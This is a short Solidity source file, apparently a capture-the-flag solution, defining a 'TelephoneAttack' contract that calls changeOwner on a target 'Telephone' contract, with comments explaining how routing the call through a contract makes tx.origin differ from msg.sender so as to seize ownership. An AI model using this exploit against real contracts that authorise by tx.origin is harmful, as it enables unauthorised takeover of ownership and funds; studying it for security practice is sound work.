// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import './Telephone.sol';

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract TelephoneAttack {
  ITelephone public target;

  constructor(address targetAddress) {
    target = ITelephone(targetAddress);
  }

  //       Step #1                      Step #2                             Step #3
  // <EOA:0x00...deadbeef> --> Calls <Contract:TelephoneAttack> --> Calls <Contract:Telephone>
  // `tx.origin` is the original caller in the callstack (EOA)
  // `msg.sender` in Step #2 is the address of the EOA
  // `msg.sender` in Step #3 is the address of the TelephoneAttack contract
  function attack() public {
    target.changeOwner(msg.sender);
  }
}
